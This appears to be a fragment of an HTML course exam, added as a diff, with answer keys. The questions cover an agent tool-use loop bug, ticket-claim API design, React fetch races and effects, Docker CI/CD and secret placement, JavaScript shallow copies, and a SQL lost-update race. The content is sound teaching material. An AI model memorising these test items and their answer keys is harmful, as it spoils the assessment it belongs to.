+<div class="question">
+  <div class="q-header"><span class="q-id">T10-Q4</span><span class="q-meta">T10 — Building an agent (10.1)<br>Spot the bug</span></div>
+  <p>This agent loop appends the assistant turn and feeds tool results back, so it avoids the infinite-loop trap. It still breaks. Find at least two problems and how you would fix each.</p>
+<pre>messages = [{&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: task}]
+while True:
+    resp = client.messages.create(
+        model=&quot;claude-opus-4-7&quot;, max_tokens=2048,
+        tools=TOOLS, messages=messages,
+    )
+    messages.append({&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: resp.content})
+    if resp.stop_reason != &quot;tool_use&quot;:
+        break
+    for block in resp.content:
+        if block.type == &quot;tool_use&quot;:
+            result = TOOLS_BY_NAME[block.name](**block.input)
+            messages.append({
+                &quot;role&quot;: &quot;user&quot;,
+                &quot;content&quot;: [{&quot;type&quot;: &quot;tool_result&quot;, &quot;content&quot;: result}],
+            })</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. The <code>tool_result</code> is missing <code>tool_use_id</code>. Each result must carry the <code>id</code> of the <code>tool_use</code> block it answers, or the API cannot pair them and rejects the call. Fix: <code>{&quot;type&quot;: &quot;tool_result&quot;, &quot;tool_use_id&quot;: block.id, &quot;content&quot;: result}</code>.</p>
+<p>2. When the model requests several tools in one turn, this appends a separate user message per result. The API expects all tool_results for one assistant turn collected into a single user message that immediately follows it; interleaving one user message per tool breaks the required structure. Fix: build one list of tool_result blocks for every tool_use block in the turn and append it as one user message.</p>
+<p>Bonus: a tool that raises is unhandled and crashes the loop; catch it and return the error text as the tool_result so the model can react.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T5-Q6</span><span class="q-meta">T5 — Deployment, auth & secrets (7.2)<br>Specification</span></div>
+  <p>You are building the ticketing piece of an event app. The app hosts many events, each identified by its own <code>event_id</code>. What it has to do:</p>
+<ul><li>Each event has its own fixed pool of free tickets (say 100). Any logged-in user can try to claim a ticket for a given event, and may hold at most one ticket per event (a user can hold tickets to several different events).</li><li>A user should be able to tell whether they currently hold a ticket for a particular event.</li><li>When a popular event&#x27;s tickets drop, thousands of users hit the app within the same few seconds, and a client on a flaky connection may fire the same request more than once.</li></ul>
+<p>Design the API for this. Do not write code, and do not worry about exact status-code numbers. Cover all four:</p>
+<ol><li>What endpoint(s) does this feature need? For each, give the HTTP method, the URL, and one sentence on what it does and what it returns. (Identity comes from the auth token, not from anything the client sends.)</li><li>The most important correctness property is that you never hand out more than 100 tickets, even under the stampede. Explain the database-level mechanism that guarantees it, and one sentence on why doing the check in application code (read the count, then insert if there is room) does not.</li><li>A flaky-connection user fires their claim twice. How do you guarantee they end up with exactly one ticket, not two?</li><li>One ambiguity in the requirements above that you would settle before building, and the call you would make.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Any clean REST shape, for example: <code>POST /api/events/{event_id}/claim</code> -- claims a ticket for the authenticated user if any remain and they do not already hold one, returning their ticket (or telling them it is sold out / they already have one); and <code>GET /api/events/{event_id}/ticket</code> -- returns whether the current user holds a ticket for this event. A <code>DELETE .../ticket</code> to release one is a reasonable third. Credit is for a sensible shape and taking identity from the token, not for specific URLs.</p>
+<p>2. Enforce capacity in the database with an atomic operation: e.g., a <code>tickets_remaining</code> counter decremented by <code>UPDATE ... SET tickets_remaining = tickets_remaining - 1 WHERE id = :e AND tickets_remaining &gt; 0</code>, treating 0 rows affected as sold out, or an insert guarded by a constraint/row lock. Reading the count and then inserting in app code is a check-then-act race: under the stampede many requests read &quot;room left&quot; before any of them inserts, so they all insert and you oversell.</p>
+<p>3. Make the claim idempotent on the user: a <code>UNIQUE(event_id, user_id)</code> constraint means a retried claim cannot create a second ticket -- the duplicate insert fails and you return their existing ticket -- or accept a client idempotency key and dedupe on it. Either way they end with exactly one ticket no matter how many retries arrive.</p>
+<p>4. A real ambiguity, e.g.: do over-capacity requests waitlist or just fail; can a user release and re-claim; is the limit one per user, per account, or per device. State the call.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T2-Q4</span><span class="q-meta">T2 — Async, fetch & races (5.2)<br>Code review</span></div>
+  <p>Two versions of a component that fetches an item&#x27;s details when the selected <code>id</code> changes. The user clicks quickly through several items. Pick the version you would ship.</p>
+<pre>// Version A
+function Detail({ id }) {
+  const [data, setData] = useState(null);
+  useEffect(() =&gt; {
+    fetch(`/api/items/${id}`).then(r =&gt; r.json()).then(setData);
+  }, [id]);
+  return &lt;div&gt;{data?.name}&lt;/div&gt;;
+}
+
+// Version B
+function Detail({ id }) {
+  const [data, setData] = useState(null);
+  useEffect(() =&gt; {
+    let active = true;
+    fetch(`/api/items/${id}`)
+      .then(r =&gt; r.json())
+      .then(d =&gt; { if (active) setData(d); });
+    return () =&gt; { active = false; };
+  }, [id]);
+  return &lt;div&gt;{data?.name}&lt;/div&gt;;
+}</pre>
+<ol><li>Justify in three to five sentences, describing the specific bug the other version has and the exact sequence of clicks that triggers it.</li><li>Both versions still share one shortcoming -- what is it?</li><li>Version B&#x27;s cleanup sets a flag rather than aborting the request. Name one thing that approach does NOT do that a real cancellation would.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Ship B. A has the out-of-order race: click item 1, then quickly item 2; if item 1&#x27;s response arrives after item 2&#x27;s, A&#x27;s last <code>setData</code> is item 1&#x27;s and the view shows item 1&#x27;s data while the prop says item 2. B sets <code>active = false</code> in the effect cleanup, which React runs before the next effect, so a superseded response is ignored and only the current id&#x27;s data is shown.</p>
+<p>2. Neither has loading or error states and neither checks <code>response.ok</code>, so a slow fetch shows nothing and a failed one shows a stale value with no feedback.</p>
+<p>3. The flag only ignores the result; the request still runs to completion and consumes network and server work, and a genuinely slow request cannot be cut off. <code>AbortController</code> would cancel the in-flight request itself.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T7-Q5</span><span class="q-meta">T7 — CI/CD with GitHub Actions (8.2)<br>Short design</span></div>
+  <p>Your pipeline: on every push to <code>main</code>, GitHub Actions builds a Docker image, pushes it to a registry, and the prod server pulls it and restarts. It works. Reason about three things:</p>
+<ol><li>The runner that builds the image and the prod server that runs it are different machines. What exactly travels from the runner to the server, through what, and why does the server never need your Dockerfile or your source code?</li><li>The image build runs the test suite (<code>RUN pytest</code>) inside the Dockerfile. Give one reason that is the wrong place for the tests in this pipeline, and where they belong.</li><li>A database password is needed by the CI job (to run tests against a real database) and by the running container in prod. Where should each come from? They are not the same place.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. The built image travels -- not the Dockerfile or the source. The runner runs <code>docker build</code> then <code>docker push</code>es the image to the registry; the prod server <code>docker pull</code>s that same image and runs it, so the registry is the handoff between the two machines. A built image already contains the base Python, the installed dependencies, and the copied app code as layers, so the server runs it as-is and never builds anything -- which is why it needs neither the Dockerfile nor the source.</p>
+<p>2. The CI workflow already runs the tests on every push before it builds and pushes, so <code>RUN pytest</code> re-runs them on every image build, couples building to test success, slows the build, and bakes test-only files into the image. Tests belong in the CI job (a separate step/job), not in the Dockerfile.</p>
+<p>3. The CI secret lives in GitHub Actions Secrets (<code>${{ secrets.DB_PASSWORD }}</code>), injected into the workflow run. The prod secret lives in the host/platform&#x27;s runtime config (env var / dashboard), injected when the container starts. Neither is baked into the image, and CI&#x27;s secret store is not the prod secret store.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T1-Q4</span><span class="q-meta">T1 — JavaScript & TypeScript (5.1)<br>Trace-through</span></div>
+  <p>The script runs to completion. Give the value printed at A, B, C, and D. For B and C, add one sentence explaining why.</p>
+<pre>const original = [
+  { id: 1, tags: [&quot;a&quot;] },
+  { id: 2, tags: [&quot;b&quot;] },
+];
+
+const copy = [...original];
+copy[0].tags.push(&quot;x&quot;);
+copy.push({ id: 3, tags: [&quot;c&quot;] });
+console.log(&quot;A:&quot;, original.length);      // ___
+console.log(&quot;B:&quot;, original[0].tags);     // ___
+
+const cloned = original.map(o =&gt; ({ ...o }));
+cloned[1].tags.push(&quot;y&quot;);
+console.log(&quot;C:&quot;, original[1].tags);     // ___
+console.log(&quot;D:&quot;, cloned[1].id);         // ___</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>A: <code>2</code>. <code>copy = [...original]</code> makes a new array, so <code>copy.push(...)</code> adds a third element to the copy only; <code>original.length</code> is still 2.</p>
+<p>B: <code>[&quot;a&quot;, &quot;x&quot;]</code>. The spread copied the array&#x27;s references, so <code>copy[0]</code> is the same object as <code>original[0]</code>; mutating <code>copy[0].tags</code> mutates that shared object, and <code>original[0].tags</code> sees it.</p>
+<p>C: <code>[&quot;b&quot;, &quot;y&quot;]</code>. <code>{ ...o }</code> copies <code>o</code>&#x27;s own properties, but <code>tags</code> is a reference to the same array, so <code>cloned[1].tags</code> is <code>original[1].tags</code>; pushing &quot;y&quot; mutates the shared array.</p>
+<p>D: <code>2</code>. <code>cloned[1]</code> is a distinct object that happens to hold the same <code>id</code> value, 2.</p>
+<p>Key idea: spread (<code>[...]</code>, <code>{...}</code>) is a shallow copy -- it duplicates the top level but leaves nested objects and arrays shared.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T8-Q7</span><span class="q-meta">T8 — Concurrency (9.1)<br>Trace-through</span></div>
+  <p><code>products.review_count</code> is a denormalized counter kept in sync as reviews are added. Two shoppers review the same product at the same instant; <code>review_count</code> starts at 5. Both transactions run their <code>SELECT review_count</code> before either runs its <code>UPDATE</code>.</p>
+<pre>@app.post(&quot;/api/products/{product_id}/reviews&quot;)
+def add_review(product_id: int, body: ReviewIn,
+               user: User = Depends(current_user)):
+    with engine.begin() as conn:
+        conn.execute(
+            text(&quot;INSERT INTO reviews (product_id, author_id, body) &quot;
+                 &quot;VALUES (:p, :u, :b)&quot;),
+            {&quot;p&quot;: product_id, &quot;u&quot;: user.id, &quot;b&quot;: body.text},
+        )
+        row = conn.execute(
+            text(&quot;SELECT review_count FROM products WHERE id = :p&quot;),
+            {&quot;p&quot;: product_id},
+        ).first()
+        conn.execute(
+            text(&quot;UPDATE products SET review_count = :c WHERE id = :p&quot;),
+            {&quot;c&quot;: row.review_count + 1, &quot;p&quot;: product_id},
+        )
+    return {&quot;ok&quot;: True}</pre>
+<ol><li>How many review rows exist afterward, and what is <code>review_count</code>?</li><li>The handler already wraps all of this in a transaction (<code>engine.begin()</code>). Why didn&#x27;t that prevent the problem?</li><li>Give a fix.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Two review rows (both INSERTs commit), but <code>review_count</code> is 6, not 7. Both SELECTs read 5, both compute 5 + 1, both write 6 -- one increment is lost, and the counter no longer matches the number of reviews.</p>
+<p>2. A transaction makes each request&#x27;s statements commit or roll back together; it does not lock the row the plain <code>SELECT</code> read. So both transactions can read <code>review_count = 5</code> before either writes, and the read-modify-write races. A transaction is not a lock.</p>
+<p>3. Make the increment atomic: <code>UPDATE products SET review_count = review_count + 1 WHERE id = :p</code>, which the database does as one locked read-and-write; or lock the row first with <code>SELECT review_count ... FOR UPDATE</code> so the second request waits. (Better still, drop the denormalized counter and derive it with <code>COUNT(*)</code>.)</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T4-Q5</span><span class="q-meta">T4 — React state & effects (7.1)<br>Short design</span></div>
+  <p>You are building the React frontend for a shared discussion board (the BBS app from the assignments). One page shows the messages for a board and lets the signed-in user post a new one. Other people post at the same time, so messages from others should appear without the user reloading the page. Assume a parent <code>&lt;Board&gt;</code> that renders a <code>&lt;MessageList&gt;</code> and a <code>&lt;NewMessageForm&gt;</code>. Do not write code -- design it:</p>
+<ol><li>What pieces of state does this page need, and which component owns each?</li><li>How do new messages -- the user&#x27;s own and other people&#x27;s -- get into the list, and how do you keep it reasonably fresh without a manual refresh? Name the approach and one cost of it.</li><li>What distinct UI states must the page handle?</li><li>Name one thing that is easy to get wrong here, and how you would avoid it.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. The messages array plus loading and error flags belong to the parent <code>&lt;Board&gt;</code> -- it owns the data and passes <code>messages</code> down to <code>&lt;MessageList&gt;</code>. The in-progress draft text belongs to <code>&lt;NewMessageForm&gt;</code> as a controlled input. The board id comes from props/route. Lifting the messages to the parent lets both the list and the post action read and refresh the same data.</p>
+<p>2. Load the list on mount with <code>useEffect</code> (fetch, then setMessages). For the user&#x27;s own post, POST it and append the server&#x27;s returned message (or refetch). For other people&#x27;s messages, poll: refetch on an interval with <code>useEffect</code> + <code>setInterval</code>, cleared in the effect&#x27;s cleanup, every few seconds. Cost: polling lags by the interval and adds server load; it is the in-scope option, since real-time push (websockets) was not covered.</p>
+<p>3. Loading (first fetch), error (fetch failed), empty (no messages yet), and the loaded list -- plus a disabled / in-flight state on the form while a post is submitting.</p>
+<p>4. Any one: showing the loading spinner on every poll blanks the list, so only show it on the first load and not on background refetches; the form double-submitting or not clearing on success; appending the raw input instead of the server&#x27;s stored message; a slow refetch landing after a newer one (ignore stale results). Pick one and the guard.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T3-Q5</span><span class="q-meta">T3 — React: components & rendering (6.1)<br>Trace-through</span></div>
+  <p>This component renders a shopping cart. Work out what it puts on the screen for an empty cart (<code>items</code> is <code>[]</code>) and for a cart with two products. One of those cases shows something the developer did not intend.</p>
+<pre>function Cart({ items }) {
+  return (
+    &lt;div&gt;
+      &lt;h2&gt;Your cart&lt;/h2&gt;
+      {items.length &amp;&amp; (
+        &lt;ul&gt;
+          {items.map(i =&gt; &lt;li key={i.id}&gt;{i.name}&lt;/li&gt;)}
+        &lt;/ul&gt;
+      )}
+      {items.length &gt; 0 &amp;&amp; &lt;button&gt;Check out&lt;/button&gt;}
+    &lt;/div&gt;
+  );
+}</pre>
+<ol><li>What is it?</li><li>Why does it happen?</li><li>How could you fix it?</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. On the empty cart it renders the <code>&lt;h2&gt;Your cart&lt;/h2&gt;</code>, then a stray <code>0</code> as text on the page (and no button). The two-product cart renders as intended -- the list and the &quot;Check out&quot; button. The unintended thing is that stray <code>0</code>.</p>
+<p>2. <code>items.length</code> is <code>0</code> on an empty cart, and <code>0 &amp;&amp; &lt;ul&gt;...</code> evaluates to <code>0</code> -- JS returns the falsy left operand -- and React renders the number <code>0</code> as text. (With two items, <code>2 &amp;&amp; &lt;ul&gt;...</code> returns the <code>&lt;ul&gt;</code>, so it renders fine.) The second line, <code>items.length &gt; 0 &amp;&amp; &lt;button&gt;</code>, is already a boolean (<code>false</code> on an empty cart), and React renders nothing for <code>false</code>, which is why the button is correctly absent.</p>
+<p>3. Make the left side a real boolean so it can never be the number <code>0</code>: <code>items.length &gt; 0 &amp;&amp; &lt;ul&gt;...</code> (or <code>items.length ? &lt;ul&gt;... : null</code>).</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T4-Q6</span><span class="q-meta">T4 — React state & effects (7.1)<br>Trace-through</span></div>
+  <p><code>&lt;Profile&gt;</code> is mounted with <code>userId={1}</code>. Its parent then re-renders it with <code>userId={2}</code>, then re-renders it again with <code>userId={2}</code> (unchanged), and finally unmounts it. List the console output, in order.</p>
+<pre>function Profile({ userId }) {
+  console.log(&quot;render&quot;, userId);
+  useEffect(() =&gt; {
+    console.log(&quot;effect&quot;, userId);
+    return () =&gt; console.log(&quot;cleanup&quot;, userId);
+  }, [userId]);
+  return &lt;p&gt;User {userId}&lt;/p&gt;;
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <pre>render 1
+effect 1
+render 2
+cleanup 1
+effect 2
+render 2
+cleanup 2</pre>
+<ul><li>Mount with 1: the component renders (<code>render 1</code>), then React runs the effect (<code>effect 1</code>).</li><li>Re-render with 2: <code>render 2</code>; <code>userId</code> changed (1 -&gt; 2), so React runs the previous effect&#x27;s cleanup (<code>cleanup 1</code>), then the new effect (<code>effect 2</code>).</li><li>Re-render with 2 again: <code>render 2</code>; the dep <code>[userId]</code> is unchanged, so the effect does not re-run and nothing else logs.</li><li>Unmount: React runs the last effect&#x27;s cleanup (<code>cleanup 2</code>).</li></ul>
+<p>Key idea: render runs first; on a dependency change React cleans up the old effect before running the new one; an unchanged dependency skips the effect entirely; and the final cleanup runs on unmount.</p></div>
+</div>
+</body>
+</html>
